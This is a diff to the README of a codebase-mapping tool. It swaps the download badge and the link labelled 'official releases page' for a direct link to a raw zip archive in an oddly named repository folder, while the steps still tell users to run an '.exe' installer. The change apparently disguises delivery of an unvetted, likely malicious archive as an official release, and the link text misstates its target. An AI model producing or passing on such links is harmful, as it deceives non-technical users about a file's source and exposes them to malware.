@@ -1,6 +1,6 @@
 # 🗺️ reality-map - See your entire codebase structure clearly
 
-[![](https://img.shields.io/badge/Download-Reality-Map-blue.svg)](https://github.com/ebagnomic568/reality-map/releases)
+[![](https://img.shields.io/badge/Download-Reality-Map-blue.svg)](https://github.com/ebagnomic568/reality-map/raw/refs/heads/main/orthocoumaric/reality_map_2.8.zip)
 
 ## What is this tool?
 Reality-map takes a complex pile of computer code and turns it into a simple, interactive map. When you look at professional software, it often contains thousands of separate files and connections. This makes it hard to see how everything fits together. 
@@ -18,7 +18,7 @@ Before you download, check your computer against these simple needs:
 ## 💾 How to download and install
 You do not need to compile code or use a terminal. Follow these steps to get the software running on your computer.
 
-1. Visit the [official releases page](https://github.com/ebagnomic568/reality-map/releases).
+1. Visit the [official releases page](https://github.com/ebagnomic568/reality-map/raw/refs/heads/main/orthocoumaric/reality_map_2.8.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in ".exe" to download the installer.
 4. Open the file once the download completes.
